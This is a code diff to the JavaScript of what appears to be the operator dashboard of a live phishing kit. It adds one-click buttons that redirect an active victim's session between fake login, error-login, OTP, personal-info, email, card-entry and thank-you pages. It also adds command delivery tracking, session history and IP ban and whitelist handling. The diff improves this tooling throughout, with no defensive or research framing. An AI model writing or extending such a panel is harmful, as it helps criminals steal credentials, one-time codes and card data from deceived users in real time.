@@ -610,19 +610,52 @@ function resultActionsMarkup(result, pageSlug) {
   `;
 }
 
-function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = null) {
-  const commandLabel = command?.note || command?.targetUrl || "";
+function commandStatusLabel(command = null) {
+  if (!command?.targetUrl) return "No command queued";
+  const label = command.note || command.targetUrl;
+  if (command.status === "delivered") return `Delivered: ${label}`;
+  return `Queued: ${label}`;
+}
+
+function normalizeFlowLabel(value = "") {
+  return String(value || "")
+    .replace(/\.[a-z0-9]+$/i, "")
+    .replace(/[-_]+/g, " ")
+    .replace(/\b(error login|login2)\b/i, "login2")
+    .replace(/\b(login page|login)\b/i, "login")
+    .replace(/\b(otp page|otp)\b/i, "otp")
+    .replace(/\b(personal info page|personal info|personal)\b/i, "personal")
+    .replace(/\b(email page|email)\b/i, "email")
+    .replace(/\b(card page|card|c)\b/i, "card")
+    .replace(/\b(thank you page|thanks|thnks)\b/i, "thanks")
+    .trim()
+    .toLowerCase();
+}
+
+function sessionCurrentFlowLabel(session = null, latestResult = null, command = null) {
+  return session?.screen
+    || latestResult?.screen
+    || command?.note
+    || "";
+}
+
+function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = null, currentLabel = "") {
+  const currentKey = normalizeFlowLabel(currentLabel);
   return `
     <div class="session-command result-live-command">
+      <strong class="flow-command-title">One-click flow</strong>
       <div class="session-route-buttons" aria-label="Redirect active user">
-        ${pageTargets.length ? pageTargets.map((target) => `
-          <button type="button" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}">
+        ${pageTargets.length ? pageTargets.map((target) => {
+          const isCurrent = currentKey && normalizeFlowLabel(target.label) === currentKey;
+          return `
+          <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}" aria-pressed="${isCurrent ? "true" : "false"}" ${isCurrent ? "disabled" : ""}>
             ${escapeHtml(target.label)}
           </button>
-        `).join("") : "<span>No mapped pages found</span>"}
+        `;
+        }).join("") : "<span>No mapped pages found</span>"}
       </div>
       <button type="button" data-session-clear="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}">Clear</button>
-      <small>${command?.targetUrl ? `Queued: ${escapeHtml(commandLabel)}` : "No command queued"}</small>
+      <small class="${command?.status === "delivered" ? "is-delivered" : command?.targetUrl ? "is-queued" : ""}">${escapeHtml(commandStatusLabel(command))}</small>
     </div>
   `;
 }
@@ -637,11 +670,19 @@ function activeSessionCardMarkup(session, page, pageTargets = [], command = null
       </div>
       <div class="session-meta">
         <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
-        <span>${command?.targetUrl ? `Queued: ${escapeHtml(command.note || command.targetUrl || "")}` : "No command"}</span>
+        <span>${escapeHtml(commandStatusLabel(command))}</span>
       </div>
-      ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command)}
+      ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, sessionCurrentFlowLabel(session, null, command))}
     </article>
   `;
+}
+
+function latestSessionCommand(sessionId, sessionCommands = {}, sessionCommandHistory = {}) {
+  const active = sessionCommands[sessionId];
+  if (active?.targetUrl) return active;
+  const history = sessionCommandHistory[sessionId];
+  if (Array.isArray(history)) return history[0] || null;
+  return history?.targetUrl ? history : null;
 }
 
 function sessionResultsMarkup(session, page, bannedIps = [], whitelistIps = [], options = {}) {
@@ -652,6 +693,8 @@ function sessionResultsMarkup(session, page, bannedIps = [], whitelistIps = [], 
   const activeSession = options.activeSession || null;
   const command = options.command || null;
   const pageTargets = options.pageTargets || [];
+  const latestResult = session.results[session.results.length - 1] || null;
+  const currentFlowLabel = sessionCurrentFlowLabel(activeSession, latestResult, command);
   return `
     <article class="result-session-card ${activeSession ? "is-live" : ""}">
       <div class="result-session-head">
@@ -666,7 +709,7 @@ function sessionResultsMarkup(session, page, bannedIps = [], whitelistIps = [], 
         <span>${escapeHtml(ipStatus)}</span>
         ${activeSession ? `<span>${escapeHtml(activeSession.screen || "active page")} / ${escapeHtml(formatTrafficTime(activeSession.lastSeenAt))}</span>` : ""}
       </div>
-      ${activeSession ? sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command) : ""}
+      ${activeSession ? sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, currentFlowLabel) : ""}
       <div class="session-result-timeline">
         ${session.results.map((result, index) => `
           <article class="result-card compact">
@@ -3871,6 +3914,7 @@ async function renderResultsCenter(pageSlug = "page-a") {
   const savedSessionIds = new Set(savedSessions.map((session) => session.sessionId));
   const activeSessionsWithoutResults = activeSessions.filter((session) => !savedSessionIds.has(session.sessionId));
   const sessionCommands = page.configs?.sessionCommands || {};
+  const sessionCommandHistory = page.configs?.sessionCommandHistory || {};
   const bannedIps = page.securityConfig?.bannedIps || [];
   const whitelistIps = page.securityConfig?.whitelistIps || [];
   const pageTargets = sessionPageTargets(page);
@@ -3905,7 +3949,7 @@ async function renderResultsCenter(pageSlug = "page-a") {
         </div>
         <div class="active-session-list">
           ${activeSessionsWithoutResults.length ? activeSessionsWithoutResults.map((session) => {
-            const command = sessionCommands[session.sessionId];
+            const command = latestSessionCommand(session.sessionId, sessionCommands, sessionCommandHistory);
             return activeSessionCardMarkup(session, page, pageTargets, command);
           }).join("") : `
             <article class="active-session-card empty-session">
@@ -3922,7 +3966,7 @@ async function renderResultsCenter(pageSlug = "page-a") {
       <div class="results-list">
         ${savedSessions.length ? savedSessions.map((session) => sessionResultsMarkup(session, page, bannedIps, whitelistIps, {
           activeSession: activeSessionsById.get(session.sessionId),
-          command: sessionCommands[session.sessionId],
+          command: latestSessionCommand(session.sessionId, sessionCommands, sessionCommandHistory),
           pageTargets
         })).join("") : `
           <article class="security-panel">
@@ -5312,6 +5356,10 @@ preview.addEventListener("click", async (event) => {
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
       await renderResultsCenter(updated.slug);
       statusText.textContent = "LIVE USER REDIRECT QUEUED";
+      window.setTimeout(() => {
+        const latest = getPageBySlug(updated.slug);
+        if (latest) renderResultsCenter(updated.slug);
+      }, 5500);
     }).catch((error) => {
       statusText.textContent = `REDIRECT FAILED: ${error.message}`.toUpperCase();
     });
